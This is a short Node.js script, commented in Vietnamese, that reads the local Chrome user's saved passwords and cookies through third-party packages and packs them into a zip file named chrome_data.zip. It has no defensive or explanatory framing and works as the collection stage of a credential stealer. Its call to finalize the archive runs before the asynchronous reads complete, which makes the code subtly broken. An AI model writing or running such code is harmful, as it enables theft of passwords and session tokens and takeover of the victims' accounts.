const fs = require('fs');
const archiver = require('archiver');
const chromeCookies = require('chrome-cookies-secure');
const chromePasswords = require('chrome-passwords');

// Thư mục lưu trữ file zip
const outputDir = './output';
if (!fs.existsSync(outputDir)) {
  fs.mkdirSync(outputDir);
}

// Tên file zip
const zipName = 'chrome_data.zip';

// Đường dẫn đến thư mục lưu trữ file zip
const outputPath = `${outputDir}/${zipName}`;

// Tạo một đối tượng Archiver để nén file
const archive = archiver('zip', { zlib: { level: 9 } });
const output = fs.createWriteStream(outputPath);
archive.pipe(output);

// Lấy thông tin cookie của người dùng Chrome
chromeCookies.getCookies((err, cookies) => {
  if (err) throw err;
  archive.append(JSON.stringify(cookies), { name: 'cookies.json' });
});

// Lấy thông tin mật khẩu của người dùng Chrome
chromePasswords.getPasswords((err, passwords) => {
  if (err) throw err;
  archive.append(JSON.stringify(passwords), { name: 'passwords.json' });
});

// Kết thúc quá trình nén file
archive.finalize();